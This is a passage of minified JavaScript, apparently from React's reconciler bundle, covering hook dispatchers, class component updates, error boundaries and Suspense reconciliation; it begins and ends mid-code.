t=="function"){e=e();var l=t(e);return function(){typeof l=="function"?l():t(null)}}if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function Sd(e,t,l){l=l!=null?l.concat([e]):null,Xs(4,4,yd.bind(null,t,e),l)}function Wi(){}function Ad(e,t){var l=Ge();t=t===void 0?null:t;var a=l.memoizedState;return t!==null&&Bi(t,a[1])?a[0]:(l.memoizedState=[e,t],e)}function Td(e,t){var l=Ge();t=t===void 0?null:t;var a=l.memoizedState;if(t!==null&&Bi(t,a[1]))return a[0];if(a=e(),ua){yl(!0);try{e()}finally{yl(!1)}}return l.memoizedState=[a,t],a}function Fi(e,t,l){return l===void 0||(tl&1073741824)!==0&&(he&261930)===0?e.memoizedState=t:(e.memoizedState=l,e=Nf(),oe.lanes|=e,Ol|=e,l)}function Ed(e,t,l,a){return bt(l,t)?l:Ba.current!==null?(e=Fi(e,l,a),bt(e,t)||(Ve=!0),e):(tl&42)===0||(tl&1073741824)!==0&&(he&261930)===0?(Ve=!0,e.memoizedState=l):(e=Nf(),oe.lanes|=e,Ol|=e,t)}function Nd(e,t,l,a,n){var s=G.p;G.p=s!==0&&8>s?s:8;var c=M.T,h={};M.T=h,er(e,!1,t,l);try{var b=n(),C=M.S;if(C!==null&&C(h,b),b!==null&&typeof b=="object"&&typeof b.then=="function"){var D=dg(b,a);Dn(e,t,D,Et(e))}else Dn(e,t,a,Et(e))}catch(k){Dn(e,t,{then:function(){},status:"rejected",reason:k},Et())}finally{G.p=s,c!==null&&h.types!==null&&(c.types=h.types),M.T=c}}function xg(){}function Ii(e,t,l,a){if(e.tag!==5)throw Error(r(476));var n=jd(e).queue;Nd(e,n,t,U,l===null?xg:function(){return Cd(e),l(a)})}function jd(e){var t=e.memoizedState;if(t!==null)return t;t={memoizedState:U,baseState:U,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:ll,lastRenderedState:U},next:null};var l={};return t.next={memoizedState:l,baseState:l,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:ll,lastRenderedState:l},next:null},e.memoizedState=t,e=e.alternate,e!==null&&(e.memoizedState=t),t}function Cd(e){var t=jd(e);t.next===null&&(t=e.alternate.memoizedState),Dn(e,t.next.queue,{},Et())}function $i(){return Ie(Zn)}function wd(){return Ge().memoizedState}function Rd(){return Ge().memoizedState}function bg(e){for(var t=e.return;t!==null;){switch(t.tag){case 24:case 3:var l=Et();e=wl(l);var a=Rl(t,e,l);a!==null&&(ft(a,t,l),jn(a,t,l)),t={cache:wi()},e.payload=t;return}t=t.return}}function vg(e,t,l){var a=Et();l={lane:a,revertLane:0,gesture:null,action:l,hasEagerState:!1,eagerState:null,next:null},Qs(e)?Dd(t,l):(l=xi(e,t,l,a),l!==null&&(ft(l,e,a),_d(l,t,a)))}function Md(e,t,l){var a=Et();Dn(e,t,l,a)}function Dn(e,t,l,a){var n={lane:a,revertLane:0,gesture:null,action:l,hasEagerState:!1,eagerState:null,next:null};if(Qs(e))Dd(t,n);else{var s=e.alternate;if(e.lanes===0&&(s===null||s.lanes===0)&&(s=t.lastRenderedReducer,s!==null))try{var c=t.lastRenderedState,h=s(c,l);if(n.hasEagerState=!0,n.eagerState=h,bt(h,c))return js(e,t,n,0),Re===null&&Ns(),!1}catch{}if(l=xi(e,t,n,a),l!==null)return ft(l,e,a),_d(l,t,a),!0}return!1}function er(e,t,l,a){if(a={lane:2,revertLane:_r(),gesture:null,action:a,hasEagerState:!1,eagerState:null,next:null},Qs(e)){if(t)throw Error(r(479))}else t=xi(e,l,a,2),t!==null&&ft(t,e,2)}function Qs(e){var t=e.alternate;return e===oe||t!==null&&t===oe}function Dd(e,t){Ga=Bs=!0;var l=e.pending;l===null?t.next=t:(t.next=l.next,l.next=t),e.pending=t}function _d(e,t,l){if((l&4194048)!==0){var a=t.lanes;a&=e.pendingLanes,l|=a,t.lanes=l,Lc(e,l)}}var _n={readContext:Ie,use:Ys,useCallback:He,useContext:He,useEffect:He,useImperativeHandle:He,useLayoutEffect:He,useInsertionEffect:He,useMemo:He,useReducer:He,useRef:He,useState:He,useDebugValue:He,useDeferredValue:He,useTransition:He,useSyncExternalStore:He,useId:He,useHostTransitionStatus:He,useFormState:He,useActionState:He,useOptimistic:He,useMemoCache:He,useCacheRefresh:He};_n.useEffectEvent=He;var zd={readContext:Ie,use:Ys,useCallback:function(e,t){return st().memoizedState=[e,t===void 0?null:t],e},useContext:Ie,useEffect:gd,useImperativeHandle:function(e,t,l){l=l!=null?l.concat([e]):null,Ps(4194308,4,yd.bind(null,t,e),l)},useLayoutEffect:function(e,t){return Ps(4194308,4,e,t)},useInsertionEffect:function(e,t){Ps(4,2,e,t)},useMemo:function(e,t){var l=st();t=t===void 0?null:t;var a=e();if(ua){yl(!0);try{e()}finally{yl(!1)}}return l.memoizedState=[a,t],a},useReducer:function(e,t,l){var a=st();if(l!==void 0){var n=l(t);if(ua){yl(!0);try{l(t)}finally{yl(!1)}}}else n=t;return a.memoizedState=a.baseState=n,e={pending:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},a.queue=e,e=e.dispatch=vg.bind(null,oe,e),[a.memoizedState,e]},useRef:function(e){var t=st();return e={current:e},t.memoizedState=e},useState:function(e){e=Ki(e);var t=e.queue,l=Md.bind(null,oe,t);return t.dispatch=l,[e.memoizedState,l]},useDebugValue:Wi,useDeferredValue:function(e,t){var l=st();return Fi(l,e,t)},useTransition:function(){var e=Ki(!1);return e=Nd.bind(null,oe,e.queue,!0,!1),st().memoizedState=e,[!1,e]},useSyncExternalStore:function(e,t,l){var a=oe,n=st();if(me){if(l===void 0)throw Error(r(407));l=l()}else{if(l=t(),Re===null)throw Error(r(349));(he&127)!==0||ed(a,t,l)}n.memoizedState=l;var s={value:l,getSnapshot:t};return n.queue=s,gd(ld.bind(null,a,s,e),[e]),a.flags|=2048,Ya(9,{destroy:void 0},td.bind(null,a,s,l,t),null),l},useId:function(){var e=st(),t=Re.identifierPrefix;if(me){var l=Vt,a=Yt;l=(a&~(1<<32-xt(a)-1)).toString(32)+l,t="_"+t+"R_"+l,l=Gs++,0<l&&(t+="H"+l.toString(32)),t+="_"}else l=fg++,t="_"+t+"r_"+l.toString(32)+"_";return e.memoizedState=t},useHostTransitionStatus:$i,useFormState:dd,useActionState:dd,useOptimistic:function(e){var t=st();t.memoizedState=t.baseState=e;var l={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return t.queue=l,t=er.bind(null,oe,!0,l),l.dispatch=t,[e,t]},useMemoCache:Pi,useCacheRefresh:function(){return st().memoizedState=bg.bind(null,oe)},useEffectEvent:function(e){var t=st(),l={impl:e};return t.memoizedState=l,function(){if((ye&2)!==0)throw Error(r(440));return l.impl.apply(void 0,arguments)}}},tr={readContext:Ie,use:Ys,useCallback:Ad,useContext:Ie,useEffect:Ji,useImperativeHandle:Sd,useInsertionEffect:bd,useLayoutEffect:vd,useMemo:Td,useReducer:Vs,useRef:md,useState:function(){return Vs(ll)},useDebugValue:Wi,useDeferredValue:function(e,t){var l=Ge();return Ed(l,Ne.memoizedState,e,t)},useTransition:function(){var e=Vs(ll)[0],t=Ge().memoizedState;return[typeof e=="boolean"?e:Mn(e),t]},useSyncExternalStore:$u,useId:wd,useHostTransitionStatus:$i,useFormState:fd,useActionState:fd,useOptimistic:function(e,t){var l=Ge();return sd(l,Ne,e,t)},useMemoCache:Pi,useCacheRefresh:Rd};tr.useEffectEvent=xd;var Od={readContext:Ie,use:Ys,useCallback:Ad,useContext:Ie,useEffect:Ji,useImperativeHandle:Sd,useInsertionEffect:bd,useLayoutEffect:vd,useMemo:Td,useReducer:Qi,useRef:md,useState:function(){return Qi(ll)},useDebugValue:Wi,useDeferredValue:function(e,t){var l=Ge();return Ne===null?Fi(l,e,t):Ed(l,Ne.memoizedState,e,t)},useTransition:function(){var e=Qi(ll)[0],t=Ge().memoizedState;return[typeof e=="boolean"?e:Mn(e),t]},useSyncExternalStore:$u,useId:wd,useHostTransitionStatus:$i,useFormState:pd,useActionState:pd,useOptimistic:function(e,t){var l=Ge();return Ne!==null?sd(l,Ne,e,t):(l.baseState=e,[e,l.queue.dispatch])},useMemoCache:Pi,useCacheRefresh:Rd};Od.useEffectEvent=xd;function lr(e,t,l,a){t=e.memoizedState,l=l(a,t),l=l==null?t:A({},t,l),e.memoizedState=l,e.lanes===0&&(e.updateQueue.baseState=l)}var ar={enqueueSetState:function(e,t,l){e=e._reactInternals;var a=Et(),n=wl(a);n.payload=t,l!=null&&(n.callback=l),t=Rl(e,n,a),t!==null&&(ft(t,e,a),jn(t,e,a))},enqueueReplaceState:function(e,t,l){e=e._reactInternals;var a=Et(),n=wl(a);n.tag=1,n.payload=t,l!=null&&(n.callback=l),t=Rl(e,n,a),t!==null&&(ft(t,e,a),jn(t,e,a))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var l=Et(),a=wl(l);a.tag=2,t!=null&&(a.callback=t),t=Rl(e,a,l),t!==null&&(ft(t,e,l),jn(t,e,l))}};function kd(e,t,l,a,n,s,c){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(a,s,c):t.prototype&&t.prototype.isPureReactComponent?!bn(l,a)||!bn(n,s):!0}function Hd(e,t,l,a){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(l,a),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(l,a),t.state!==e&&ar.enqueueReplaceState(t,t.state,null)}function da(e,t){var l=t;if("ref"in t){l={};for(var a in t)a!=="ref"&&(l[a]=t[a])}if(e=e.defaultProps){l===t&&(l=A({},l));for(var n in e)l[n]===void 0&&(l[n]=e[n])}return l}function Ld(e){Es(e)}function Ud(e){console.error(e)}function Bd(e){Es(e)}function Ks(e,t){try{var l=e.onUncaughtError;l(t.value,{componentStack:t.stack})}catch(a){setTimeout(function(){throw a})}}function Gd(e,t,l){try{var a=e.onCaughtError;a(l.value,{componentStack:l.stack,errorBoundary:t.tag===1?t.stateNode:null})}catch(n){setTimeout(function(){throw n})}}function nr(e,t,l){return l=wl(l),l.tag=3,l.payload={element:null},l.callback=function(){Ks(e,t)},l}function qd(e){return e=wl(e),e.tag=3,e}function Yd(e,t,l,a){var n=l.type.getDerivedStateFromError;if(typeof n=="function"){var s=a.value;e.payload=function(){return n(s)},e.callback=function(){Gd(t,l,a)}}var c=l.stateNode;c!==null&&typeof c.componentDidCatch=="function"&&(e.callback=function(){Gd(t,l,a),typeof n!="function"&&(kl===null?kl=new Set([this]):kl.add(this));var h=a.stack;this.componentDidCatch(a.value,{componentStack:h!==null?h:""})})}function yg(e,t,l,a,n){if(l.flags|=32768,a!==null&&typeof a=="object"&&typeof a.then=="function"){if(t=l.alternate,t!==null&&Oa(t,l,n,!0),l=yt.current,l!==null){switch(l.tag){case 31:case 13:return _t===null?so():l.alternate===null&&Le===0&&(Le=3),l.flags&=-257,l.flags|=65536,l.lanes=n,a===Os?l.flags|=16384:(t=l.updateQueue,t===null?l.updateQueue=new Set([a]):t.add(a),Rr(e,a,n)),!1;case 22:return l.flags|=65536,a===Os?l.flags|=16384:(t=l.updateQueue,t===null?(t={transitions:null,markerInstances:null,retryQueue:new Set([a])},l.updateQueue=t):(l=t.retryQueue,l===null?t.retryQueue=new Set([a]):l.add(a)),Rr(e,a,n)),!1}throw Error(r(435,l.tag))}return Rr(e,a,n),so(),!1}if(me)return t=yt.current,t!==null?((t.flags&65536)===0&&(t.flags|=256),t.flags|=65536,t.lanes=n,a!==Ti&&(e=Error(r(422),{cause:a}),Sn(wt(e,l)))):(a!==Ti&&(t=Error(r(423),{cause:a}),Sn(wt(t,l))),e=e.current.alternate,e.flags|=65536,n&=-n,e.lanes|=n,a=wt(a,l),n=nr(e.stateNode,a,n),Oi(e,n),Le!==4&&(Le=2)),!1;var s=Error(r(520),{cause:a});if(s=wt(s,l),Gn===null?Gn=[s]:Gn.push(s),Le!==4&&(Le=2),t===null)return!0;a=wt(a,l),l=t;do{switch(l.tag){case 3:return l.flags|=65536,e=n&-n,l.lanes|=e,e=nr(l.stateNode,a,e),Oi(l,e),!1;case 1:if(t=l.type,s=l.stateNode,(l.flags&128)===0&&(typeof t.getDerivedStateFromError=="function"||s!==null&&typeof s.componentDidCatch=="function"&&(kl===null||!kl.has(s))))return l.flags|=65536,n&=-n,l.lanes|=n,n=qd(n),Yd(n,e,l,a),Oi(l,n),!1}l=l.return}while(l!==null);return!1}var sr=Error(r(461)),Ve=!1;function $e(e,t,l,a){t.child=e===null?Qu(t,null,l,a):ca(t,e.child,l,a)}function Vd(e,t,l,a,n){l=l.render;var s=t.ref;if("ref"in a){var c={};for(var h in a)h!=="ref"&&(c[h]=a[h])}else c=a;return sa(t),a=Gi(e,t,l,c,s,n),h=qi(),e!==null&&!Ve?(Yi(e,t,n),al(e,t,n)):(me&&h&&Si(t),t.flags|=1,$e(e,t,a,n),t.child)}function Pd(e,t,l,a,n){if(e===null){var s=l.type;return typeof s=="function"&&!bi(s)&&s.defaultProps===void 0&&l.compare===null?(t.tag=15,t.type=s,Xd(e,t,s,a,n)):(e=ws(l.type,null,a,t,t.mode,n),e.ref=t.ref,e.return=t,t.child=e)}if(s=e.child,!hr(e,n)){var c=s.memoizedProps;if(l=l.compare,l=l!==null?l:bn,l(c,a)&&e.ref===t.ref)return al(e,t,n)}return t.flags|=1,e=Ft(s,a),e.ref=t.ref,e.return=t,t.child=e}function Xd(e,t,l,a,n){if(e!==null){var s=e.memoizedProps;if(bn(s,a)&&e.ref===t.ref)if(Ve=!1,t.pendingProps=a=s,hr(e,n))(e.flags&131072)!==0&&(Ve=!0);else return t.lanes=e.lanes,al(e,t,n)}return or(e,t,l,a,n)}function Qd(e,t,l,a){var n=a.children,s=e!==null?e.memoizedState:null;if(e===null&&t.stateNode===null&&(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),a.mode==="hidden"){if((t.flags&128)!==0){if(s=s!==null?s.baseLanes|l:l,e!==null){for(a=t.child=e.child,n=0;a!==null;)n=n|a.lanes|a.childLanes,a=a.sibling;a=n&~s}else a=0,t.child=null;return Kd(e,t,s,l,a)}if((l&536870912)!==0)t.memoizedState={baseLanes:0,cachePool:null},e!==null&&_s(t,s!==null?s.cachePool:null),s!==null?Ju(t,s):Hi(),Wu(t);else return a=t.lanes=536870912,Kd(e,t,s!==null?s.baseLanes|l:l,l,a)}else s!==null?(_s(t,s.cachePool),Ju(t,s),Dl(),t.memoizedState=null):(e!==null&&_s(t,null),Hi(),Dl());return $e(e,t,n,l),t.child}function zn(e,t){return e!==null&&e.tag===22||t.stateNode!==null||(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),t.sibling}function Kd(e,t,l,a,n){var s=Mi();return s=s===null?null:{parent:qe._currentValue,pool:s},t.memoizedState={baseLanes:l,cachePool:s},e!==null&&_s(t,null),Hi(),Wu(t),e!==null&&Oa(e,t,a,!0),t.childLanes=n,null}function Zs(e,t){return t=Ws({mode:t.mode,children:t.children},e.mode),t.ref=e.ref,e.child=t,t.return=e,t}function Zd(e,t,l){return ca(t,e.child,null,l),e=Zs(t,t.pendingProps),e.flags|=2,St(t),t.memoizedState=null,e}function Sg(e,t,l){var a=t.pendingProps,n=(t.flags&128)!==0;if(t.flags&=-129,e===null){if(me){if(a.mode==="hidden")return e=Zs(t,a),t.lanes=536870912,zn(null,e);if(Ui(t),(e=_e)?(e=ih(e,Dt),e=e!==null&&e.data==="&"?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:Tl!==null?{id:Yt,overflow:Vt}:null,retryLane:536870912,hydrationErrors:null},l=Du(e),l.return=t,t.child=l,Fe=t,_e=null)):e=null,e===null)throw Nl(t);return t.lanes=536870912,null}return Zs(t,a)}var s=e.memoizedState;if(s!==null){var c=s.dehydrated;if(Ui(t),n)if(t.flags&256)t.flags&=-257,t=Zd(e,t,l);else if(t.memoizedState!==null)t.child=e.child,t.flags|=128,t=null;else throw Error(r(558));else if(Ve||Oa(e,t,l,!1),n=(l&e.childLanes)!==0,Ve||n){if(a=Re,a!==null&&(c=Uc(a,l),c!==0&&c!==s.retryLane))throw s.retryLane=c,ta(e,c),ft(a,e,c),sr;so(),t=Zd(e,t,l)}else e=s.treeContext,_e=zt(c.nextSibling),Fe=t,me=!0,El=null,Dt=!1,e!==null&&Ou(t,e),t=Zs(t,a),t.flags|=4096;return t}return e=Ft(e.child,{mode:a.mode,children:a.children}),e.ref=t.ref,t.child=e,e.return=t,e}function Js(e,t){var l=t.ref;if(l===null)e!==null&&e.ref!==null&&(t.flags|=4194816);else{if(typeof l!="function"&&typeof l!="object")throw Error(r(284));(e===null||e.ref!==l)&&(t.flags|=4194816)}}function or(e,t,l,a,n){return sa(t),l=Gi(e,t,l,a,void 0,n),a=qi(),e!==null&&!Ve?(Yi(e,t,n),al(e,t,n)):(me&&a&&Si(t),t.flags|=1,$e(e,t,l,n),t.child)}function Jd(e,t,l,a,n,s){return sa(t),t.updateQueue=null,l=Iu(t,a,l,n),Fu(e),a=qi(),e!==null&&!Ve?(Yi(e,t,s),al(e,t,s)):(me&&a&&Si(t),t.flags|=1,$e(e,t,l,s),t.child)}function Wd(e,t,l,a,n){if(sa(t),t.stateNode===null){var s=Ma,c=l.contextType;typeof c=="object"&&c!==null&&(s=Ie(c)),s=new l(a,s),t.memoizedState=s.state!==null&&s.state!==void 0?s.state:null,s.updater=ar,t.stateNode=s,s._reactInternals=t,s=t.stateNode,s.props=a,s.state=t.memoizedState,s.refs={},_i(t),c=l.contextType,s.context=typeof c=="object"&&c!==null?Ie(c):Ma,s.state=t.memoizedState,c=l.getDerivedStateFromProps,typeof c=="function"&&(lr(t,l,c,a),s.state=t.memoizedState),typeof l.getDerivedStateFromProps=="function"||typeof s.getSnapshotBeforeUpdate=="function"||typeof s.UNSAFE_componentWillMount!="function"&&typeof s.componentWillMount!="function"||(c=s.state,typeof s.componentWillMount=="function"&&s.componentWillMount(),typeof s.UNSAFE_componentWillMount=="function"&&s.UNSAFE_componentWillMount(),c!==s.state&&ar.enqueueReplaceState(s,s.state,null),wn(t,a,s,n),Cn(),s.state=t.memoizedState),typeof s.componentDidMount=="function"&&(t.flags|=4194308),a=!0}else if(e===null){s=t.stateNode;var h=t.memoizedProps,b=da(l,h);s.props=b;var C=s.context,D=l.contextType;c=Ma,typeof D=="object"&&D!==null&&(c=Ie(D));var k=l.getDerivedStateFromProps;D=typeof k=="function"||typeof s.getSnapshotBeforeUpdate=="function",h=t.pendingProps!==h,D||typeof s.UNSAFE_componentWillReceiveProps!="function"&&typeof s.componentWillReceiveProps!="function"||(h||C!==c)&&Hd(t,s,a,c),Cl=!1;var w=t.memoizedState;s.state=w,wn(t,a,s,n),Cn(),C=t.memoizedState,h||w!==C||Cl?(typeof k=="function"&&(lr(t,l,k,a),C=t.memoizedState),(b=Cl||kd(t,l,b,a,w,C,c))?(D||typeof s.UNSAFE_componentWillMount!="function"&&typeof s.componentWillMount!="function"||(typeof s.componentWillMount=="function"&&s.componentWillMount(),typeof s.UNSAFE_componentWillMount=="function"&&s.UNSAFE_componentWillMount()),typeof s.componentDidMount=="function"&&(t.flags|=4194308)):(typeof s.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=a,t.memoizedState=C),s.props=a,s.state=C,s.context=c,a=b):(typeof s.componentDidMount=="function"&&(t.flags|=4194308),a=!1)}else{s=t.stateNode,zi(e,t),c=t.memoizedProps,D=da(l,c),s.props=D,k=t.pendingProps,w=s.context,C=l.contextType,b=Ma,typeof C=="object"&&C!==null&&(b=Ie(C)),h=l.getDerivedStateFromProps,(C=typeof h=="function"||typeof s.getSnapshotBeforeUpdate=="function")||typeof s.UNSAFE_componentWillReceiveProps!="function"&&typeof s.componentWillReceiveProps!="function"||(c!==k||w!==b)&&Hd(t,s,a,b),Cl=!1,w=t.memoizedState,s.state=w,wn(t,a,s,n),Cn();var R=t.memoizedState;c!==k||w!==R||Cl||e!==null&&e.dependencies!==null&&Ms(e.dependencies)?(typeof h=="function"&&(lr(t,l,h,a),R=t.memoizedState),(D=Cl||kd(t,l,D,a,w,R,b)||e!==null&&e.dependencies!==null&&Ms(e.dependencies))?(C||typeof s.UNSAFE_componentWillUpdate!="function"&&typeof s.componentWillUpdate!="function"||(typeof s.componentWillUpdate=="function"&&s.componentWillUpdate(a,R,b),typeof s.UNSAFE_componentWillUpdate=="function"&&s.UNSAFE_componentWillUpdate(a,R,b)),typeof s.componentDidUpdate=="function"&&(t.flags|=4),typeof s.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof s.componentDidUpdate!="function"||c===e.memoizedProps&&w===e.memoizedState||(t.flags|=4),typeof s.getSnapshotBeforeUpdate!="function"||c===e.memoizedProps&&w===e.memoizedState||(t.flags|=1024),t.memoizedProps=a,t.memoizedState=R),s.props=a,s.state=R,s.context=b,a=D):(typeof s.componentDidUpdate!="function"||c===e.memoizedProps&&w===e.memoizedState||(t.flags|=4),typeof s.getSnapshotBeforeUpdate!="function"||c===e.memoizedProps&&w===e.memoizedState||(t.flags|=1024),a=!1)}return s=a,Js(e,t),a=(t.flags&128)!==0,s||a?(s=t.stateNode,l=a&&typeof l.getDerivedStateFromError!="function"?null:s.render(),t.flags|=1,e!==null&&a?(t.child=ca(t,e.child,null,n),t.child=ca(t,null,l,n)):$e(e,t,l,n),t.memoizedState=s.state,e=t.child):e=al(e,t,n),e}function Fd(e,t,l,a){return aa(),t.flags|=256,$e(e,t,l,a),t.child}var ir={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function rr(e){return{baseLanes:e,cachePool:Gu()}}function cr(e,t,l){return e=e!==null?e.childLanes&~l:0,t&&(e|=Tt),e}function Id(e,t,l){var a=t.pendingProps,n=!1,s=(t.flags&128)!==0,c;if((c=s)||(c=e!==null&&e.memoizedState===null?!1:(Be.current&2)!==0),c&&(n=!0,t.flags&=-129),c=(t.flags&32)!==0,t.flags&=-33,e===null){if(me){if(n?Ml(t):Dl(),(e=_e)?(e=ih(e,Dt),e=e!==null&&e.data!=="&"?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:Tl!==null?{id:Yt,overflow:Vt}:null,retryLane:536870912,hydrationErrors:null},l=Du(e),l.return=t,t.child=l,Fe=t,_e=null)):e=null,e===null)throw Nl(t);return Xr(e)?t.lanes=32:t.lanes=536870912,null}var h=a.children;return a=a.fallback,n?(Dl(),n=t.mode,h=Ws({mode:"hidden",children:h},n),a=la(a,n,l,null),h.return=t,a.return=t,h.sibling=a,t.child=h,a=t.child,a.memoizedState=rr(l),a.childLanes=cr(e,c,l),t.memoizedState=ir,zn(null,a)):(Ml(t),ur(t,h))}var b=e.memoizedState;if(b!==null&&(h=b.dehydrated,h!==null)){if(s)t.flags&256?(Ml(t),t.flags&=-257,t=dr(e,t,l)):t.memoizedState!==null?(Dl(),t.child=e.child,t.flags|=128,t=null):(Dl(),h=a.fallback,n=t.mode,a=Ws({mode:"visible",children:a.children},n),h=la(h,n,l,null),h.flags|=2,a.return=t,h.return=t,a.sibling=h,t.child=a,ca(t,e.child,null,l),a=t.child,a.memoizedState=rr(l),a.childLanes=cr(e,c,l),t.memoizedState=ir,t=zn(null,a));else if(Ml(t),Xr(h)){if(c=h.nextSibling&&h.nextSibling.dataset,c)var C=c.dgst;c=C,a=Error(r(419)),a.stack="",a.digest=c,Sn({value:a,source:null,stack:null}),t=dr(e,t,l)}else if(Ve||Oa(e,t,l,!1),c=(l&e.childLanes)!==0,Ve||c){if(c=Re,c!==null&&(a=Uc(c,l),a!==0&&a!==b.retryLane))throw b.retryLane=a,ta(e,a),ft(c,e,a),sr;Pr(h)||so(),t=dr(e,t,l)}else Pr(h)?(t.flags|=192,t.child=e.child,t=null):(e=b.treeContext,_e=zt(h.nextSibling),Fe=t,me=!0,El=null,Dt=!1,e!==null&&Ou(t,e),t=ur(t,a.children),t.flags|=4096);return t}return n?(Dl(),h=a.fallback,n=t.mode,b=e.child,C=b.sibling,a=Ft(b,{mode:"hidden",children:a.children}),a.subtreeFlags=b.subtreeFlags&65011712,C!==null?h=Ft(C,h):(h=la(h,n,l,null),h.flags|=2),h.return=t,a.return=t,a.sibling=h,t.child=a,zn(null,a),a=t.child,h=e.child.memoizedState,h===null?h=rr(l):(n=h.cachePool,n!==null?(b=qe._currentValue,n=n.parent!==b?{parent:b,pool:b}:n):n=Gu(),h={baseLanes:h.baseLanes|l,cachePool:n}),a.memoizedState=h,a.childLanes=cr(e,c,l),t.memoizedState=ir,zn(e.child,a)):(Ml(t),l=e.child,e=l.sibling,l=Ft(l,{mode:"visible",children:a.children}),l.return=t,l.sibling=null,e!==null&&(c=t.deletions,c===null?(t.deletions=[e],t.flags|=16):c.push(e)),t.child=l,t.memoizedState=null,l)}function ur(e,t){return t=Ws({mode:"visible",children:t},e.mode),t.return=e,e.child=t}function Ws(e,t){return e=vt(22,e,null,t),e.lanes=0,e}function dr(e,t,l){return ca(t,e.child,null,l),e=ur(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function $d(e,t,l){e.lanes|=t;var a=e.alternate;a!==null&&(a.lanes|=t),ji(e.return,t,l)}function fr(e,t,l,a,n,s){var c=e.memoizedState;c===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:a,tail:l,tailMode:n,treeForkCount:s}:(c.isBackwards=t,c.rendering=null,c.renderingStartTime=0,c.last=a,c.tail=l,c.tailMode=n,c.treeForkCount=s)}function ef(e,t,l){var a=t.pendingProps,n=a.revealOrder,s=a.tail;a=a.children;var c=Be.current,h=(c&2)!==0;if(h?(c=c&1|2,t.flags|=128):c&=1,B(Be,c),$e(e,t,a,l),a=me?yn:0,!h&&e!==null&&(e.flags&128)!==0)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&$d(e,l,t);else if(e.tag===19)$d(e,l,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}switch(n){case"forwards":for(l=t.child,n=null;l!==null;)e=l.alternate,e!==null&&Us(e)===null&&(n=l),l=l.sibling;l=n,l===null?(n=t.child,t.child=null):(n=l.sibling,l.sibling=null),fr(t,!1,n,l,s,a);break;case"backwards":case"unstable_legacy-backwards":for(l=null,n=t.child,t.child=null;n!==null;){if(e=n.alternate,e!==null&&Us(e)===null){t.child=n;break}e=n.sibling,n.sibling=l,l=n,n=e}fr(t,!0,l,null,s,a);break;case"together":fr(t,!1,null,null,void 0,a);break;default:t.memoizedState=null}return t.child}function al(e,t,l){if(e!==null&&(t.dependencies=e.dependencies),Ol|=t.lanes,(l&t.childLanes)===0)if(e!==null){if(Oa(e,t,l,!1),(l&t.childLanes)===0)return null}else return null;if(e!==null&&t.child!==e.child)throw Error(r(153));if(t.child!==null){for(e=t.child,l=Ft(e,e.pendingProps),t.child=l,l.return=t;e.sibling!==null;)e=e.sibling,l=l.sibling=Ft(e,e.pendingProps),l.return=t;l.sibling=null}return t.child}function hr(e,t){return(e.lanes&t)!==0?!0:(e=e.dependencies,!!(e!==null&&Ms(e)))}function Ag(e,t,l){switch(t.tag){case 3:Ke(t,t.stateNode.containerInfo),jl(t,qe,e.memoizedState.cache),aa();break;case 27:case 5:qt(t);break;case 4:Ke(t,t.stateNode.containerInfo);break;case 10:jl(t,t.type,t.memoizedProps.value);break;case 31:if(t.memoizedState!==null)return t.flags|=128,Ui(t),null;break;case 13:var a=t.memoizedState;if(a!==null)return a.dehydrated!==null?(Ml(t),t.flags|=128,null):(l&t.child.childLanes)!==0?Id(e,t,l):(Ml(t),e=al(e,t,l),e!==null?e.sibling:null);Ml(t);break;case 19:var n=(e.flags&128)!==0;if(a=(l&t.childLanes)!==0,a||(Oa(e,t,l,!1),a=(l&t.childLanes)!==0),n){if(a)return ef(e,t,l);t.flags|=128}if(n=t.memoizedState,n!==null&&(n.rendering=null,n.tail=null,n.lastEffect=null),B(Be,Be.current),a)break;return null;case 22:return t.lanes=0,Qd(e,t,l,t.pendingProps);case 24:jl(t,qe,e.memoizedState.cache)}return al(e,t,l)}function tf(e,t,l){if(e!==null)if(e.memoizedProps!==t.pendingProps)Ve=!0;else{if(!hr(e,l)&&(t.flags&128)===0)return Ve=!1,Ag(e,t,l);Ve=(e.flags&131072)!==0}else Ve=!1,me&&(t.flags&1048576)!==0&&zu(t,yn,t.index);switch(t.lanes=0,t.tag){case 16:e:{var a=t.pendingProps;if(e=ia(t.elementType),t.type=e,typeof e=="function")bi(e)?(a=da(e,a),t.tag=1,t=Wd(null,t,e,a,l)):(t.tag=0,t=or(null,t,e,a,l));else{if(e!=null){var n=e.$$typeof;if(n===se){t.tag=11,t=Vd(null,t,e,a,l);break e}else if(n===F){t.tag=14,t=Pd(null,t,e,a,l);break e}}throw t=tt(e)||e,Error(r(306,t,""))}}return t;case 0:return or(e,t,t.type,t.pendingProps,l);case 1:return a=t.type,n=da(a,t.pendingProps),Wd(e,t,a,n,l);case 3:e:{if(Ke(t,t.stateNode.containerInfo),e===null)throw Error(r(387));a=t.pendingProps;var s=t.memoizedState;n=s.element,zi(e,t),wn(t,a,null,l);var c=t.memoizedState;if(a=c.cache,jl(t,qe,a),a!==s.cache&&Ci(t,[qe],l,!0),Cn(),a=c.element,s.isDehydrated)if(s={element:a,isDehydrated:!1,cache:c.cache},t.updateQueue.baseState=s,t.memoizedState=s,t.flags&256){t=Fd(e,t,a,l);break e}else if(a!==n){n=wt(Error(r(424)),t),Sn(n),t=Fd(e,t,a,l);break e}else 